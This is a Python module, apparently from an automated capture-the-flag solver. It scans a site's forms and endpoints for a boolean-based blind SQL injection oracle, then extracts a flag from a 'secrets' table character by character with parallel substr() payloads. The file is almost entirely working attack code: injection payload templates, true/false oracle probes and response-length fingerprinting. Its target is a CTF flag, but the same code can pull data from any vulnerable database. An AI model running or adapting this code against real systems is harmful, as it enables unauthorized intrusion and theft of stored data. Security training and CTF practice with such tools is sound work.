"""Blind SQL injection flag extraction.

Detects a boolean-based blind SQLi (app shows "found" vs "no match" based
on whether a query returns rows), then extracts the flag character by
character with `substr((SELECT v FROM secrets WHERE k='flag'), i, 1) = 'c'`
payloads — each position is probed in parallel.

Auto-discovery: scans the homepage forms + every discovered endpoint for an
oracle (two probes `' OR 1=1--` vs `' OR 1=2--` that yield visibly different
bodies), then uses that fingerprint to classify subsequent probes.
"""
from core import httpx
from core.parallel import pmap

CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789_{}-!"
)

# payload templates tried per oracle endpoint (first one that extracts a
# plausible flag wins). AND (not OR) is essential: inside `LIKE '%$q%'` an
# OR leaves the left operand `LIKE '%'` true for every row, so the oracle
# never discriminates; AND makes the whole predicate depend on the probe.
_TEMPLATES = [
    lambda c, i: f"' AND substr((SELECT v FROM secrets WHERE k='flag'),{i},1)='{c}'-- ",
    lambda c, i: f"' AND substr((SELECT v FROM secrets WHERE k='flag'),{i},1)='{c}'#",
    lambda c, i: f"x' AND substr((SELECT v FROM secrets WHERE k='flag'),{i},1)='{c}'-- ",
]


def _find_oracle(base, page_html, endpoints):
    """Locate (url, param, true_fp, false_fp) boolean oracle."""
    from . import injections as inj
    candidates = inj.extract_params(base.rstrip("/") + "/", page_html)
    for ep in endpoints:
        r = httpx.get(ep, timeout=8)
        if r is not None:
            candidates.extend(inj.extract_params(ep, r.text))
    seen = set()
    for target, params in candidates:
        for param in params:
            key = (target, param)
            if key in seen:
                continue
            seen.add(key)
            for true_p, false_p in (("' AND 1=1-- ", "' AND 1=2-- "),
                                    ("' OR 1=1-- ", "' OR 1=2-- "),
                                    ("' OR '1'='1", "' OR '1'='2")):
                try:
                    t = httpx.get(inj._build_url(target, param, true_p), timeout=8)
                    f = httpx.get(inj._build_url(target, param, false_p), timeout=8)
                except Exception:
                    continue
                if t is None or f is None:
                    continue
                if t.status == f.status and t.text and f.text and \
                        t.text != f.text and len(t.text) != len(f.text):
                    return target, param, t.text, f.text
    return None


def _probe(target, param, true_fp, false_fp, payload):
    """True if the response matches the 'found' fingerprint."""
    from . import injections as inj
    r = httpx.get(inj._build_url(target, param, payload), timeout=8)
    if r is None:
        return False
    if len(r.text) == len(true_fp):
        return True
    if len(r.text) == len(false_fp):
        return False
    return r.text == true_fp


def _oracle_sane(target, param, true_fp, false_fp):
    """Re-check the oracle still discriminates."""
    from . import injections as inj
    t = httpx.get(inj._build_url(target, param, "' AND 1=1-- "), timeout=8)
    f = httpx.get(inj._build_url(target, param, "' AND 1=2-- "), timeout=8)
    if t is None or f is None:
        return False
    return len(t.text) == len(true_fp) and len(f.text) == len(false_fp)


def _extract_at(target, param, true_fp, false_fp, i, template):
    for c in CHARSET:
        if _probe(target, param, true_fp, false_fp, template(c, i)):
            return c
    return None


def blind_extract(base, page_html, endpoints, max_len=100):
    """Main entry. Returns (findings_lines, flags)."""
    lines = []
    found = _find_oracle(base, page_html, endpoints)
    if not found:
        return lines, []
    target, param, true_fp, false_fp = found
    lines.append(f"  [!] blind-SQLi oracle: {target} param={param} "
                 f"(true={len(true_fp)}B / false={len(false_fp)}B)")

    for template in _TEMPLATES:
        if not _oracle_sane(target, param, true_fp, false_fp):
            return lines, []
        # sanity: position 1 must extract *something* with this template
        if _extract_at(target, param, true_fp, false_fp, 1, template) is None:
            continue

        def one(i):
            return i, _extract_at(target, param, true_fp, false_fp, i, template)

        chars = {}
        for i, res in pmap(one, range(1, max_len + 1), workers=12,
                          desc="blind sqli"):
            # pmap yields (item, result); `one(i)` returns (i, char)
            if isinstance(res, Exception):
                continue
            _, ch = res
            chars[i] = ch

        flag = "".join(chars[i] for i in range(1, max_len + 1) if chars.get(i))
        end = flag.find("}")
        if end != -1:
            flag = flag[:end + 1]
        else:
            flag = flag.rstrip(" ")
        if len(flag) >= 8 and "{" in flag:
            from core.flag import extract_flags
            known, cands = extract_flags(flag)
            hits = known + cands
            lines.append(f"  [!] blind-SQLi flag ผ่าน {param}: {flag}")
            return lines, (hits or [flag])
        lines.append(f"  [!] blind-SQLi extract: {flag!r} (ยังไม่เหมือน flag)")

    return lines, []
